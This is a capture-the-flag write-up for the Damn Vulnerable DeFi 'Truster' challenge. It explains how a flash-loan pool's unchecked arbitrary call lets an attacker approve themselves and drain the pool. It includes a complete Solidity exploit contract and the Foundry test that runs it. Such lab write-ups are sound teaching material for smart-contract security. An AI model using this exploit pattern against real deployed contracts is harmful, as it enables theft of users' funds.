You can check the challenge [here](https://www.damnvulnerabledefi.xyz/challenges/truster/).

This contract is a pool that offers flash loans for free, but it does not implement the EIP-3156 standard, making it vulnerable.

```solidity
	Line: 39 function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)

```

The function signature above takes the address of the borrower and the target address along with data to pass. We can pass an arbitrary target contract with arbitrary data (function selector + arguments), and the pool will execute it for us, allowing us to approve our address to withdraw all the tokens from the pool. The payload would be:

```solidity
bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)));
```

The player should make only one transaction, so we can execute the attack in a contract’s constructor.

The Solution would be:

```solidity
contract Attack {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), token.balanceOf(address(pool)));

        pool.flashLoan(0, address(this), address(token), payload);

        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}

function test_truster() public checkSolvedByPlayer {
        Attack attack = new Attack(pool, token, recovery);
    }
```